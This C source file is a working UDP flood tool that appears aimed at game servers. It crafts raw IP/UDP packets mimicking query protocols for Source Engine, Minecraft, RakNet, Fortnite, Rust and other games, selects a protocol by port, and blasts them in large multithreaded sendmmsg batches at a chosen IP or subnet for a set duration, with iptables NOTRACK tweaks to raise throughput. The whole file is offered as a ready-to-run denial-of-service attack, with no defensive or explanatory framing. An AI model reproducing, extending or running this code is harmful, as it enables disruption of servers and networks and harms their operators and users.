#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <signal.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/uio.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netdb.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sched.h>
#include <stdint.h>

#define BATCH_MAX 1024

static volatile sig_atomic_t running = 1;

static void handle_sigint(int sig) {
    (void)sig;
    running = 0;
}


typedef struct { uint64_t s; } rng_t;

static inline rng_t rng_seed(uint64_t seed) {
    return (rng_t){ seed ? seed : 1 };
}

static inline uint64_t rng_u64(rng_t *r) {
    r->s ^= r->s >> 12;
    r->s ^= r->s << 25;
    r->s ^= r->s >> 27;
    return r->s * 0x2545F4914F6CDD1DULL;
}

static inline uint32_t rng_u32(rng_t *r) {
    return (uint32_t)rng_u64(r);
}

static inline void rng_buf(rng_t *r, void *buf, size_t len) {
    unsigned char *p = buf;
    for (size_t i = 0; i < len; i++)
        p[i] = (unsigned char)rng_u32(r);
}

static uint32_t resolve(const char *host) {
    struct addrinfo *ai;
    if (getaddrinfo(host, NULL, NULL, &ai) != 0) return 0;
    uint32_t a = ((struct sockaddr_in *)ai->ai_addr)->sin_addr.s_addr;
    freeaddrinfo(ai);
    return a;
}

static uint32_t get_src(uint32_t dst) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return 0;
    struct sockaddr_in sn = {
        .sin_family = AF_INET,
        .sin_addr.s_addr = dst,
        .sin_port = htons(80)
    };
    if (connect(fd, (struct sockaddr *)&sn, sizeof(sn)) < 0) {
        close(fd);
        return 0;
    }
    struct sockaddr_in lc;
    socklen_t sl = sizeof(lc);
    if (getsockname(fd, (struct sockaddr *)&lc, &sl) < 0) {
        close(fd);
        return 0;
    }
    close(fd);
    return lc.sin_addr.s_addr;
}

static uint16_t ip_csum(const void *buf, size_t len) {
    const uint16_t *w = buf;
    uint32_t sum = 0;
    for (size_t i = 0; i < len / 2; i++)
        sum += w[i];
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (uint16_t)~sum;
}

static inline void wb(unsigned char *b, unsigned int *o, unsigned char v) {
    b[(*o)++] = v;
}

static inline void wfill(unsigned char *b, unsigned int *o, unsigned char v, unsigned int n) {
    memset(b + *o, v, n);
    *o += n;
}

static inline void wcpy(unsigned char *b, unsigned int *o, const void *src, unsigned int n) {
    memcpy(b + *o, src, n);
    *o += n;
}

static inline void wstr(unsigned char *b, unsigned int *o, const char *s) {
    while (*s)
        b[(*o)++] = (unsigned char)*s++;
}

static inline void wbe64(unsigned char *b, unsigned int *o, uint64_t v) {
    for (int i = 56; i >= 0; i -= 8)
        b[(*o)++] = (unsigned char)(v >> i);
}

typedef struct {
    const char *name;
    int min_pay;
    unsigned int (*build)(unsigned char *buf, unsigned int sz, rng_t *rng);
} game_t;

static unsigned int gs_build(unsigned char *b, unsigned int sz, rng_t *r) {
    (void)r;
    if (sz < 25) return 0;
    unsigned int o = 0;
    wfill(b, &o, 0xFF, 4);
    wb(b, &o, 0x54);
    wstr(b, &o, "Source Engine Query");
    wb(b, &o, 0);
    return o;
}

static unsigned int mcq_build(unsigned char *b, unsigned int sz, rng_t *r) {
    if (sz < 8) return 0;
    unsigned int o = 0;
    wb(b, &o, 0xFE); wb(b, &o, 0xFD);
    wb(b, &o, 0x09);
    for (int i = 0; i < 4; i++) wb(b, &o, (unsigned char)rng_u32(r));
    wb(b, &o, 0);
    return o;
}

static unsigned int q3_build(unsigned char *b, unsigned int sz, rng_t *r) {
    (void)r;
    if (sz < 12) return 0;
    unsigned int o = 0;
    wfill(b, &o, 0xFF, 4);
    wstr(b, &o, "getinfo");
    wb(b, &o, 0);
    return o;
}

static unsigned int rk_build(unsigned char *b, unsigned int sz, rng_t *r) {
    if (sz < 33) return 0;
    unsigned int o = 0;
    wb(b, &o, 0x01);
    uint64_t ts = (uint64_t)(time(NULL) * 1000ULL + rng_u32(r) % 1000);
    wbe64(b, &o, ts);
    static const unsigned char magic[16] = {
        0x00,0xFF,0xFF,0x00,0xFE,0xFE,0xFE,0xFE,
        0xFD,0xFD,0xFD,0xFD,0x12,0x34,0x56,0x78
    };
    wcpy(b, &o, magic, 16);
    uint64_t guid = (uint64_t)rng_u32(r) | ((uint64_t)rng_u32(r) << 32);
    wbe64(b, &o, guid);
    return o;
}

static unsigned int samp_build(unsigned char *b, unsigned int sz, rng_t *r) {
    (void)r;
    if (sz < 9) return 0;
    unsigned int o = 0;
    wstr(b, &o, "SAMPi");
    wfill(b, &o, 0, 4);
    return o;
}

static unsigned int tee_build(unsigned char *b, unsigned int sz, rng_t *r) {
    (void)r;
    if (sz < 15) return 0;
    unsigned int o = 0;
    wfill(b, &o, 0xFF, 10);
    wstr(b, &o, "gie3");
    wb(b, &o, 0);
    return o;
}

static unsigned int openttd_build(unsigned char *b, unsigned int sz, rng_t *r) {
    (void)r;
    if (sz < 6) return 0;
    static const unsigned char pkt[6] = {0x00,0x00,0x03,0x00,0x00,0x00};
    unsigned int o = 0;
    wcpy(b, &o, pkt, 6);
    return o;
}

static unsigned int terraria_build(unsigned char *b, unsigned int sz, rng_t *r) {
    (void)r;
    if (sz < 6) return 0;
    unsigned int o = 0;
    wfill(b, &o, 0, 4);
    wb(b, &o, 0x44); wb(b, &o, 0);
    return o;
}

static unsigned int ts3_build(unsigned char *b, unsigned int sz, rng_t *r) {
    if (sz < 7) return 0;
    unsigned int o = 0;
    wb(b, &o, 0x05);
    for (int i = 0; i < 6; i++) wb(b, &o, (unsigned char)rng_u32(r));
    return o;
}

static unsigned int rnd_build(unsigned char *b, unsigned int sz, rng_t *r) {
    rng_buf(r, b, sz);
    return sz;
}

static unsigned int valheim_build(unsigned char *b, unsigned int sz, rng_t *r) {
    (void)r;
    if (sz < 14) return 0;
    static const unsigned char pkt[14] = {
        0xFE,0x01,0x00,0x00,0x00,0x00,0x01,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00
    };
    unsigned int o = 0;
    wcpy(b, &o, pkt, 14);
    return o;
}

static unsigned int ue_query_build(unsigned char *b, unsigned int sz, rng_t *r) {
    (void)r;
    if (sz < 5) return 0;
    unsigned int o = 0;
    wfill(b, &o, 0xFF, 4);
    wb(b, &o, 0x71);
    return o;
}

enum {
    GM_SRC, GM_MCQ, GM_Q3, GM_RK, GM_GSRC,
    GM_SAMP, GM_TEE, GM_OPENTTD, GM_TERRARIA, GM_TS3, GM_RND,
    GM_VALHEIM, GM_FORTNITE, GM_RL,
    GM_RUST, GM_7DTD, GM_PALWORLD, GM_VRISING,
    GM_COUNT
};

static const game_t games[GM_COUNT] = {
    [GM_SRC]     = { "Source Engine (CS:GO, CS2, TF2, Dota 2)",  25, gs_build },
    [GM_GSRC]    = { "GoldSrc (HL1, CS 1.6, CZ)",               25, gs_build },
    [GM_MCQ]     = { "Minecraft Query (Java)",                   8,  mcq_build },
    [GM_Q3]      = { "Quake 3 / Quake Live",                    12,  q3_build },
    [GM_RK]      = { "RakNet (Bedrock MC, GTA V)",              33,  rk_build },
    [GM_SAMP]    = { "SAMP (SA-MP)",                             9,  samp_build },
    [GM_TEE]     = { "Teeworlds / DDNet",                       15,  tee_build },
    [GM_OPENTTD] = { "OpenTTD",                                  6,  openttd_build },
    [GM_TERRARIA]= { "Terraria",                                 6,  terraria_build },
    [GM_TS3]     = { "TeamSpeak 3",                              7,  ts3_build },
    [GM_RND]     = { "Generic / Random",                         1,  rnd_build },
    [GM_VALHEIM] = { "Valheim",                                  14, valheim_build },
    [GM_FORTNITE]= { "Fortnite (UE5 query)",                     5,  ue_query_build },
    [GM_RL]      = { "Rocket League (UE3 query)",                5,  ue_query_build },
    [GM_RUST]    = { "Rust",                                      25, gs_build },
    [GM_7DTD]    = { "7 Days to Die",                             25, gs_build },
    [GM_PALWORLD]= { "Palworld",                                  25, gs_build },
    [GM_VRISING] = { "V Rising",                                  25, gs_build },
};

static int detect_game(int port) {
    if (port >= 2456 && port <= 2458) return GM_VALHEIM;
    if (port >= 27000 && port <= 27099)
        return port <= 27020 ? GM_GSRC : GM_SRC;
    if (port == 25565) return GM_MCQ;
    if (port >= 27960 && port <= 27999) return GM_Q3;
    if (port >= 19132 && port <= 19133) return GM_RK;
    if (port == 7777) return GM_SAMP;
    if (port >= 8303 && port <= 8310) return GM_TEE;
    if (port == 3979) return GM_OPENTTD;
    if (port == 9987) return GM_TS3;
    if (port == 28015) return GM_RUST;
    if (port >= 26900 && port <= 26902) return GM_7DTD;
    if (port == 8211) return GM_PALWORLD;
    if (port >= 9876 && port <= 9877) return GM_VRISING;
    if (port >= 9000 && port <= 9100) return GM_FORTNITE;
    if (port >= 7000 && port <= 8000) return GM_RL;
    return GM_RND;
}

static int parse_game(const char *s) {
    static const char *names[] = {
        [GM_SRC]     = "source",
        [GM_GSRC]    = "goldsrc",
        [GM_MCQ]     = "minecraft",
        [GM_Q3]      = "quake3",
        [GM_RK]      = "raknet",
        [GM_SAMP]    = "samp",
        [GM_TEE]     = "teeworlds",
        [GM_OPENTTD] = "openttd",
        [GM_TERRARIA]= "terraria",
        [GM_TS3]     = "teamspeak3",
        [GM_RND]     = "random",
        [GM_VALHEIM] = "valheim",
        [GM_FORTNITE]= "fortnite",
        [GM_RL]      = "rocketleague",
        [GM_RUST]    = "rust",
        [GM_7DTD]    = "7dtd",
        [GM_PALWORLD]= "palworld",
        [GM_VRISING] = "vrising",
    };
    char buf[64], c;
    int i = 0;
    while ((c = *s++) && i < (int)sizeof(buf) - 1)
        buf[i++] = (c >= 'A' && c <= 'Z') ? c + 32 : c;
    buf[i] = 0;
    for (int g = 0; g < GM_COUNT; g++)
        if (strcmp(buf, names[g]) == 0) return g;
    return -1;
}

static int cidr(const char *s, uint32_t *base, int *pre) {
    char *slash = strchr(s, '/');
    if (!slash) return 0;
    char ip[32];
    int l = (int)(slash - s);
    if (l >= (int)sizeof(ip)) return 0;
    memcpy(ip, s, l); ip[l] = 0;
    if (inet_pton(AF_INET, ip, base) != 1) return 0;
    *pre = atoi(slash + 1);
    return (*pre >= 16 && *pre <= 30) ? 1 : 0;
}

static uint32_t cidr_mask(int pre) {
    return ~0U << (32 - pre);
}

static void fmtbw(char *b, size_t n, uint64_t v) {
    if (v >= 1000000000ULL)
        snprintf(b, n, "%.2f Gbps", (double)v / 1000000000.0);
    else if (v >= 1000000ULL)
        snprintf(b, n, "%.2f Mbps", (double)v / 1000000.0);
    else if (v >= 1000ULL)
        snprintf(b, n, "%.2f Kbps", (double)v / 1000.0);
    else
        snprintf(b, n, "%llu bps", (unsigned long long)v);
}

static void ipt_notrack(unsigned int mark, int del) {
    char cmd[128];
    snprintf(cmd, sizeof(cmd),
        "iptables -t raw -%c OUTPUT -m mark --mark 0x%x -j NOTRACK 2>/dev/null",
        del ? 'D' : 'I', mark);
    int r = system(cmd);
    (void)r;
}

static void flush_route(void) {
    int fd = open("/proc/sys/net/ipv4/route/flush", O_WRONLY);
    if (fd >= 0) {
        ssize_t w = write(fd, "1", 1);
        (void)w;
        close(fd);
    }
}

typedef struct {
    uint32_t s_ip, d_base;
    int nhosts, dport, dur, game;
    int tid;
    unsigned int mark;
} cfg_t;

typedef struct {
    uint64_t sent, bytes, errors;
} tstat_t;

static tstat_t *g_tstats;

static void *worker(void *arg) {
    const cfg_t *cfg = arg;
    int my_id = cfg->tid;

    static int ncpus;
    if (!ncpus) { ncpus = (int)sysconf(_SC_NPROCESSORS_ONLN); if (ncpus < 1) ncpus = 1; }
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(my_id % ncpus, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpuset), &cpuset);

    rng_t rng = rng_seed((uint64_t)pthread_self() ^ (uint64_t)time(NULL) ^ (uint64_t)my_id * 6364136223846793005ULL);

    int nsk = 4, sk[4] = {-1,-1,-1,-1};
    int pay = games[cfg->game].min_pay;
    int hl_ip = sizeof(struct iphdr);
    int hl_ud = sizeof(struct udphdr);
    int psz = hl_ip + hl_ud + pay;

    size_t mh_sz = sizeof(struct mmsghdr);
    size_t memsize = (size_t)psz * BATCH_MAX
                   + sizeof(struct sockaddr_in) * BATCH_MAX
                   + sizeof(struct iovec) * BATCH_MAX
                   + mh_sz * BATCH_MAX;

    char *mem = malloc(memsize);
    if (!mem) {
        fprintf(stderr, "  [thread %d] malloc failed: %s\n", my_id, strerror(errno));
        goto cleanup;
    }

    char *pkb = mem;
    struct sockaddr_in *sa = (struct sockaddr_in *)(pkb + (size_t)psz * BATCH_MAX);
    struct iovec *io = (struct iovec *)(sa + BATCH_MAX);
    struct mmsghdr *mv = (struct mmsghdr *)(io + BATCH_MAX);

    for (unsigned int n = 0; n < BATCH_MAX; n++) {
        mv[n].msg_hdr.msg_name = &sa[n];
        mv[n].msg_hdr.msg_namelen = sizeof(struct sockaddr_in);
        mv[n].msg_hdr.msg_iov = &io[n];
        mv[n].msg_hdr.msg_iovlen = 1;
        io[n].iov_len = (size_t)psz;
        sa[n].sin_family = AF_INET;
        sa[n].sin_port = htons(cfg->dport);
    }

    for (int i = 0; i < nsk; i++) {
        sk[i] = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (sk[i] < 0) {
            fprintf(stderr, "  [thread %d] socket: %s\n", my_id, strerror(errno));
            goto cleanup;
        }
        int one = 1;
        if (setsockopt(sk[i], IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
            fprintf(stderr, "  [thread %d] IP_HDRINCL: %s\n", my_id, strerror(errno));

        int sb = 8388608;
        setsockopt(sk[i], SOL_SOCKET, SO_SNDBUF, &sb, sizeof(sb));

        int mtu = IP_PMTUDISC_DO;
        setsockopt(sk[i], IPPROTO_IP, IP_MTU_DISCOVER, &mtu, sizeof(mtu));

        if (cfg->mark)
            setsockopt(sk[i], SOL_SOCKET, SO_MARK, &cfg->mark, sizeof(cfg->mark));
    }

    unsigned char pl[1408];
    uint32_t bsp = (uint32_t)rng_u32(&rng);
    int64_t deadline = cfg->dur > 0 ? (int64_t)time(NULL) + cfg->dur : INT64_MAX;
    uint32_t si = 0;
    uint64_t lsent = 0, lbytes = 0, lerrs = 0;

    while (running && time(NULL) < deadline) {
        unsigned int pgl = games[cfg->game].build(pl, pay, &rng);
        if (pgl > (unsigned int)pay) pgl = pay;
        if (pgl < 1) { rng_buf(&rng, pl, pay); pgl = pay; }

        uint32_t dbo = rng_u32(&rng);
        uint32_t np1 = (uint32_t)cfg->nhosts;
        uint16_t iid = (uint16_t)rng_u32(&rng);

        for (unsigned int n = 0; n < BATCH_MAX; n++) {
            uint32_t dst = cfg->d_base
                + ((dbo + n * 31337U) % (np1 ? np1 : 1U));
            char *pkt = pkb + n * psz;

            struct iphdr *ip = (struct iphdr *)pkt;
            ip->version = 4;
            ip->ihl = 5;
            ip->tos = 0;
            ip->tot_len = htons((uint16_t)psz);
            ip->id = htons(iid + (uint16_t)n);
            ip->frag_off = 0;
            ip->ttl = 255;
            ip->protocol = IPPROTO_UDP;
            ip->saddr = cfg->s_ip;
            ip->daddr = dst;
            ip->check = 0;

            struct udphdr *u = (struct udphdr *)(pkt + hl_ip);
            u->source = htons((bsp + n * 65521U) % 64511U + 1024U);
            u->dest = htons(cfg->dport);
            u->len = htons((uint16_t)(hl_ud + pgl));
            u->check = 0;

            memcpy(pkt + hl_ip + hl_ud, pl, pgl);
            if ((int)pgl < pay)
                rng_buf(&rng, pkt + hl_ip + hl_ud + pgl, pay - pgl);

            ip->check = ip_csum(pkt, hl_ip);

            sa[n].sin_addr.s_addr = dst;
            io[n].iov_base = pkt;
            io[n].iov_len = (size_t)psz;
        }

        int fd = sk[si % (unsigned int)nsk];
        si++;
        int off = 0;

        while (off < BATCH_MAX) {
            int r = sendmmsg(fd, mv + off, BATCH_MAX - off, MSG_DONTWAIT);
            if (r > 0) off += r;
            else if (r == 0) break;
            else if (errno == EAGAIN || errno == EWOULDBLOCK)
                usleep(5);
            else {
                lerrs++;
                break;
            }
        }

        if (off > 0) {
            lsent += off;
            lbytes += (uint64_t)off * (uint64_t)psz;
        }
    }

    g_tstats[my_id].sent = lsent;
    g_tstats[my_id].bytes = lbytes;
    g_tstats[my_id].errors = lerrs;

cleanup:
    free(mem);
    for (int i = 0; i < nsk; i++)
        if (sk[i] >= 0) close(sk[i]);
    return NULL;
}

static void *stats_thread(void *arg) {
    int nthreads = *(const int *)arg;
    uint64_t prev_sent = 0, prev_bytes = 0;
    while (running) {
        sleep(2);
        flush_route();
        uint64_t total_sent = 0, total_bytes = 0, total_errs = 0;
        for (int i = 0; i < nthreads; i++) {
            total_sent  += g_tstats[i].sent;
            total_bytes += g_tstats[i].bytes;
            total_errs  += g_tstats[i].errors;
        }
        uint32_t pps = (uint32_t)((total_sent - prev_sent) / 2);
        uint64_t bps = (total_bytes - prev_bytes) * 8 / 2;
        prev_sent = total_sent; prev_bytes = total_bytes;
        char bw[32];
        fmtbw(bw, sizeof(bw), bps);
        printf("\r  %llu pkts | %llu err | %u pps | %s  ",
               (unsigned long long)total_sent,
               (unsigned long long)total_errs,
               pps, bw);
        fflush(stdout);
    }
    printf("\n");
    return NULL;
}

static void usage(const char *n) {
    printf(
"Usage: %s <target> <port> <time> [options]\n"
"  <target>    IP or CIDR (/16-/30)\n"
"  <port>      UDP port\n"
"  <time>      seconds (0 = inf)\n\n"
"  -t N        threads  [4]\n"
"  -g NAME     force game (source, minecraft, rust, 7dtd, etc)\n"
"  -h          help\n\n"
"  Port-based game detection:\n"
"    2456-2458     Valheim\n"
"    27000-27099   Source Engine / GoldSrc\n"
"    25565         Minecraft Query\n"
"    27960-27999   Quake 3 / Quake Live\n"
"    19132-19133   RakNet (Bedrock MC, GTA V)\n"
"    7777          SAMP\n"
"    8211          Palworld\n"
"    8303-8310     Teeworlds / DDNet\n"
"    3979          OpenTTD\n"
"    9876-9877     V Rising\n"
"    9987          TeamSpeak 3\n"
"    9000-9100     Fortnite (UE query)\n"
"    7000-8000     Rocket League (UE query)\n"
"    26900-26902   7 Days to Die\n"
"    28015         Rust\n"
"    other         Generic / Random\n"
, n);
}

int main(int argc, char **argv) {
    int thr = 4, opt, manual_game = -1;
    while ((opt = getopt(argc, argv, "t:g:h")) != -1) {
        switch (opt) {
        case 't':
            thr = atoi(optarg);
            if (thr < 1) { fprintf(stderr, "Threads must be >= 1\n"); return 1; }
            if (thr > 512) { fprintf(stderr, "Threads must be <= 512\n"); return 1; }
            break;
        case 'g':
            manual_game = parse_game(optarg);
            if (manual_game < 0) { fprintf(stderr, "Unknown game: %s\n", optarg); return 1; }
            break;
        default:
            usage(argv[0]);
            return opt == 'h' ? 0 : 1;
        }
    }
    if (optind + 3 > argc) { usage(argv[0]); return 1; }

    const char *target = argv[optind];
    int port = atoi(argv[optind + 1]);
    int dur   = atoi(argv[optind + 2]);
    if (port < 1 || port > 65535) { fprintf(stderr, "Bad port\n"); return 1; }
    if (geteuid() != 0) { fprintf(stderr, "Need root\n"); return 1; }

    uint32_t db, dst;
    int pre, nh;
    char sb[64] = "";

    if (cidr(target, &db, &pre)) {
        nh = 1 << (32 - pre);
        uint32_t h = ntohl(db) & cidr_mask(pre);
        db = htonl(h);
        dst = db;
        snprintf(sb, sizeof(sb), "%d IPs (/%d)", nh, pre);
    } else if (strchr(target, '/')) {
        fprintf(stderr, "Bad CIDR\n"); return 1;
    } else {
        dst = resolve(target);
        if (!dst) { fprintf(stderr, "Resolve failed\n"); return 1; }
        db = dst; nh = 1;
    }

    uint32_t src = get_src(dst);
    if (!src) { fprintf(stderr, "No source\n"); return 1; }

    int game = manual_game >= 0 ? manual_game : detect_game(port);
    int pay = games[game].min_pay;
    int psz = sizeof(struct iphdr) + sizeof(struct udphdr) + pay;

    struct in_addr sa_in = { .s_addr = src }, da_in = { .s_addr = dst };

    struct sigaction ssa = { .sa_handler = handle_sigint };
    sigaction(SIGINT, &ssa, NULL);
    sigaction(SIGTERM, &ssa, NULL);

    unsigned int mark = (rng_u32(&(rng_t){1}) & 0xFFFF) + 1;

    printf(
"  Target:    %s:%d\n"
"  Subnet:    %s\n"
"  Source:    %s\n"
"  Threads:   %d\n"
"  Game:      %s\n"
"  Size:      %d B (pkt %d B)\n"
"  Time:      %ds\n"
"  Press Ctrl+C to stop\n\n",
        inet_ntoa(da_in), port, sb[0] ? sb : "single",
        inet_ntoa(sa_in), thr, games[game].name,
        pay, psz, dur > 0 ? dur : 0);

    g_tstats = calloc((size_t)thr, sizeof(tstat_t));
    if (!g_tstats) { fprintf(stderr, "calloc failed\n"); return 1; }

    ipt_notrack(mark, 0);

    pthread_t st;
    if (pthread_create(&st, NULL, stats_thread, &thr) != 0) {
        fprintf(stderr, "Failed to create stats thread\n");
        ipt_notrack(mark, 1);
        free(g_tstats);
        return 1;
    }

    cfg_t *cfgs = calloc((size_t)thr, sizeof(cfg_t));
    pthread_t *ts = malloc(sizeof(pthread_t) * thr);
    if (!cfgs || !ts) {
        fprintf(stderr, "malloc failed\n");
        free(cfgs); free(ts);
        running = 0; pthread_join(st, NULL);
        ipt_notrack(mark, 1);
        free(g_tstats);
        return 1;
    }

    for (int i = 0; i < thr; i++) {
        cfgs[i] = (cfg_t){
            .s_ip = src, .d_base = db, .nhosts = nh,
            .dport = port, .dur = dur, .game = game,
            .tid = i, .mark = mark
        };
        if (pthread_create(&ts[i], NULL, worker, &cfgs[i]) != 0) {
            fprintf(stderr, "Failed to create worker %d\n", i);
            thr = i;
            running = 0;
            break;
        }
    }

    for (int i = 0; i < thr; i++)
        pthread_join(ts[i], NULL);

    running = 0;
    pthread_join(st, NULL);

    free(ts); free(cfgs);

    ipt_notrack(mark, 1);

    uint64_t total_sent = 0, total_bytes = 0, total_errs = 0;
    for (int i = 0; i < thr; i++) {
        total_sent  += g_tstats[i].sent;
        total_bytes += g_tstats[i].bytes;
        total_errs  += g_tstats[i].errors;
    }
    free(g_tstats);

    char bw[32];
    fmtbw(bw, sizeof(bw), total_bytes * 8 / (dur > 0 ? dur : 1));
    printf("\n  Final: %llu pkts, %llu bytes (%s avg), %llu errors\n",
           (unsigned long long)total_sent, (unsigned long long)total_bytes, bw,
           (unsigned long long)total_errs);
    return 0;
}
